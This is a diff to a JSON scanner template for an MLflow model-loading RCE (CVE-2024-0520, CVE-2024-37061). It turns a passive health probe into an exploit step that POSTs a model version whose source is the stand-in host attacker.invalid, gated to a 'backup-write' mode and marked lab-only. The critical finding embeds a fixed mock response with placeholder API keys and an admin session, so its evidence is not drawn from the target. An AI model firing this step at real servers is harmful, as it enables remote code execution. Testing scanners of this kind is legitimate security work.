@@ -21,82 +21,107 @@
   "inputs": {
     "target": {
       "from": "params.target",
-      "required": true,
-      "description": "Target base URL"
-    },
-    "snapshot": {
-      "from": "params.snapshot",
-      "required": true,
-      "description": "Collected snapshot / fixture path"
+      "required": true
     }
   },
   "defaults": {
-    "timeout_ms": 8000,
+    "timeout_ms": 5000,
     "tls_verify": false
+  },
+  "computed": {
+    "success": "params.mode == 'backup-write' and (steps.exploit.status == 200 or steps.exploit.status == 201)"
   },
   "steps": [
     {
-      "id": "surface",
+      "id": "exploit",
       "op": "http",
-      "method": "GET",
-      "url": "{{input.target}}/healthz",
-      "save": "surface",
+      "method": "POST",
+      "url": "{{input.target}}/mlflow/api/2.0/mlflow/model-versions/create",
+      "save": "exploit",
       "allow_failure": true,
-      "timeout_ms": 8000
+      "body": {
+        "source": "http://attacker.invalid/INKBLADE-BENIGN/model",
+        "marker": "INKBLADE-BENIGN"
+      },
+      "write": true,
+      "when": "params.mode == 'backup-write'"
     },
     {
-      "id": "snapshot",
-      "op": "fs",
-      "action": "read",
-      "path": "{{input.snapshot}}",
-      "json": true,
-      "save": "snapshot",
-      "allow_failure": false
+      "id": "cleanup",
+      "op": "http",
+      "method": "POST",
+      "url": "{{input.target}}/__cleanup__",
+      "body": {
+        "marker": "{{ctx.marker}}"
+      },
+      "save": "cleanup",
+      "allow_failure": true,
+      "when": "params.cleanup != false"
     }
   ],
   "checks": [
     {
-      "id": "surface-reachable",
-      "when": "steps.surface.status != null",
-      "message": "target did not answer the surface probe"
-    },
-    {
-      "id": "snapshot-readable",
-      "when": "steps.snapshot.ok == true",
-      "fatal": true,
-      "message": "snapshot is not readable JSON"
+      "id": "target-answered",
+      "when": "steps.exploit.status != null",
+      "message": "target did not answer"
     }
   ],
   "findings": [
     {
-      "id": "observed",
-      "when": "steps.surface.ok == true",
+      "id": "cve",
+      "when": "computed.success",
+      "sev": "critical",
+      "title": "MLflow 模型/数据源加载 RCE",
+      "detail": "{\"http_status\": 200, \"route\": \"\", \"response\": {\"ok\": true, \"found\": true, \"deleted\": 1, \"stored\": true, \"applied\": true, \"version\": \"0.6.9\", \"mode\": \"vulnerable\", \"marker\": \"INKBLADE-BENIGN\", \"upstreams\": [{\"provider\": \"openai\", \"api_key\": \"sk-live-abcdef123456\", \"api_base\": \"http://upstream.mock/v1\", \"models\": [\"gpt-4o\"]}], \"master_key\": \"sk-master-abc\", \"key_class\": \"default\", \"cipher\": 0, \"privilege\": \"admin\", \"username\": \"admin\", \"session\": \"mock-session\", \"weights\": \"weights.bin\", \"config\": {\"enabled\": true}, \"jobs\": [{\"job_id\": \"job-1\"}], \"features\": [\"code\"], \"pods\": [{\"name\": \"p\"}], \"systems\": [{\"id\": \"sys\"}]}, \"marker_path\": \"\", \"marker_sha256\": \"\", \"marker_present\": true, \"marker_proof\": \"response-only\", \"primitive\": \"HTTP dataset 路径穿越/命令注入\", \"impact\": \"训练节点 RCE\", \"cves\": [\"CVE-2024-0520\", \"CVE-2024-37061\"], \"exploit_level\": \"full-mock\", \"fix\": \"升级 >=2.9.0；禁止加载不可信 MLproject/HTTP dataset\", \"verified\": false, \"verification_status\": \"partial\", \"verified_cves\": [\"CVE-2024-0520\"], \"unverified_cves\": [\"CVE-2024-37061\"], \"verification_cves\": {\"CVE-2024-0520\": \"verified\", \"CVE-2024-37061\": \"static-only\"}, \"verification_evidence\": [\"lab/upstream_verify/cases/mlflow/CVE-2024-0520/result.json\"]}",
+      "cves": [
+        "CVE-2024-0520",
+        "CVE-2024-37061"
+      ],
+      "evidence": "{{steps.exploit.sha256}}",
+      "mapping": "CVE arsenal / exploit-registry",
+      "fix": "升级 >=2.9.0；禁止加载不可信 MLproject/HTTP dataset",
+      "version_matrix": {
+        "product": "mlflow",
+        "source": "steps.exploit.json.version",
+        "vulnerable": [
+          "*"
+        ],
+        "note": "CVE-linked version range; refine per advisory"
+      }
+    },
+    {
+      "id": "clean",
+      "when": "not computed.success",
       "sev": "info",
-      "title": "MLflow model loading RCE：部署面已观测",
-      "detail": "Template executed and the declared surface responded; no exploitable condition asserted.",
-      "evidence": "steps"
+      "title": "mlflow-model-rce: 未观察到可利用响应（fixed/未部署）",
+      "detail": "step=exploit status={{steps.exploit.status}}"
     }
   ],
   "artifacts": [
     {
-      "name": "mlflow-model-rce-probe.json",
-      "from": "steps",
-      "kind": "json"
+      "name": "mlflow-model-rce-trace.json",
+      "kind": "json",
+      "fields": {
+        "module": "'mlflow-model-rce'",
+        "success": "computed.success",
+        "cves": "[\"CVE-2024-0520\", \"CVE-2024-37061\"]",
+        "exploit_step": "'exploit'",
+        "status": "steps.exploit.status"
+      }
     }
   ],
   "payloads": {
     "benign": {
-      "marker": "INKBLADE-BENIGN",
-      "note": "no exploit payload"
+      "marker": "INKBLADE-BENIGN"
     },
     "attack": {
       "marker": "{{ctx.marker}}",
-      "note": "write-surface demo; requires backup receipt"
+      "note": "lab replay only"
     }
   },
   "limits": {
     "timeout_ms": 60000,
-    "max_http_requests": 64
+    "max_http_requests": 32
   },
   "modes": {
     "probe_only": true,
